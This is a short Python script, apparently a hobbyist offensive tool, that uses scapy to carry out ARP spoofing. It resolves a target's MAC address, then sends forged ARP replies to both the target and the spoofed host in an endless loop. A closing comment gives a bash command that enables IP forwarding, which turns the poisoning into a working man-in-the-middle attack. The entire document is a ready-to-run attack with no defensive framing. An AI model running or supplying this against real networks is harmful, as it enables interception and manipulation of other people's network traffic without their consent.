import scapy.all as scapy
import time
from optparse import OptionParser
parser = OptionParser()
parser.add_option("-t", "--target", dest="target_ip", help="Enter the target_ip_address")
parser.add_option("-s", "--spoof", dest = "spoofed_ip", help="Enter the spoofed_ip_address")
(options, arguments) = parser.parse_args()
def find_mac(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
        request = broadcast/arp_request
        packet_ans = scapy.srp(request, verbose=False, timeout=1)[0]
        
        return packet_ans[0][1].hwsrc
        
def spoof(target_ip, spoof_ip):
        target_mac = find_mac(target_ip)
        packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
        scapy.send(packet)


T = options.target_ip
S = options.spoofed_ip
while True:
        spoof(T,S)
        spoof(S,T)
        time.sleep(2)

# Upon running this program there needs a bash command to run in parallel i.e. IP FORWARDING

'''
#!/bin/bash
echo 1 > /proc/sys/net/ipv4/ip_forward
this is the bash command save as ip_forward.sh
to run -> bash ip_forward.sh'''

